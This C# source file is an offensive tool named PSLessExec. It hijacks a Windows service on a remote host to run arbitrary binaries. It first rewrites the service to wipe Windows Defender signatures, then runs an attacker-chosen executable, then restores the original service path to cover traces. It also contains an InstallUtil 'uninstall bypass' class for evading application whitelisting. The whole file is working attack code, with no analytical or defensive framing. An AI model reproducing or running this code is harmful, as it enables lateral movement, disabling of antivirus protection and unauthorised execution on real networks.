using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;

namespace PSLessExec
{
    public class PSLessExec
    {
        public static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        public static uint SERVICE_ALL_ACCESS = 0xF01FF;
        public static uint SERVICE_DEMAND_START = 0x3;
        public static uint SERVICE_NO_CHANGE = 0xffffffff;

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwServiceType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwStartType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwErrorControl;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpBinaryPathName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpLoadOrderGroup;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwTagID;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDependencies;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpServiceStartName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDisplayName;
        };

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, uint dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("Example: PSLessExec.exe appsrv01 SensorService notepad.exe");
                return;
            }

            // Open remote SCManager
            IntPtr SCMHandle = OpenSCManager(args[0], null, SC_MANAGER_ALL_ACCESS);
            Console.WriteLine($"Got handle on SCManager on {args[0]}: {SCMHandle}.");

            // Access target service
            IntPtr schService = OpenService(SCMHandle, args[1], SERVICE_ALL_ACCESS);
            Console.WriteLine($"Got handle on target service {args[1]}: {schService}.");

            // Get current binPath (two passes, first is to determine the buffer size needed)
            UInt32 dwBytesNeeded;
            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            Marshal.PtrToStructure(ptr, qsc);
            String binPathOrig = qsc.lpBinaryPathName;

            // Pass 1: Disable Defender signatures
            String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, defBypass, null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{defBypass}', result: {bResult}.");

            // Run the service for Pass 1
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service, defender signatures should be wiped.");

            // Pass 2: Run the chosen binary
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");

            // Run the service for Pass 2
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service. Check for execution!");

            // Pass 3: Restore original binPath
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
            Console.WriteLine($"Restored service binary to '{binPathOrig}', result: {bResult}.");
        }
    }

    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            List<string> argslist = new List<string>();
            string lParam1 = Convert.ToString(GetParam("Target"));
            string lParam2 = Convert.ToString(GetParam("Service"));
            string lParam3 = Convert.ToString(GetParam("BinaryToRun"));
            
            argslist.Add(lParam1);
            argslist.Add(lParam2);
            argslist.Add(lParam3);

            String[] args = argslist.ToArray();

            PSLessExec.Main(args);
        }

        private object GetParam(string p)
        {
            string[] inputvars = new string[] { "Target", "Service", "BinaryToRun" };
            try
            {
                if (this.Context != null)
                {
                    if (this.Context.Parameters[p] != null && inputvars.Contains(p))
                    {
                        string lParamValue = this.Context.Parameters[p];
                        if (lParamValue == "")
                        {
                            Console.WriteLine("You have provided a parameter that must be assigned a value: " + p);
                            System.Environment.Exit(0);
                        }
                        else if (lParamValue != null)
                            return "/" + p + ":" + lParamValue;
                    }
                    else if (this.Context.Parameters[p] != null && Array.Exists(inputvars, element => element != p))
                    {
                        string lParamValue = "/" + p;
                        return lParamValue;
                    }
                    else
                    {
                    }
                }
            }
            catch
            {
            }
            return string.Empty;
        }
    }
}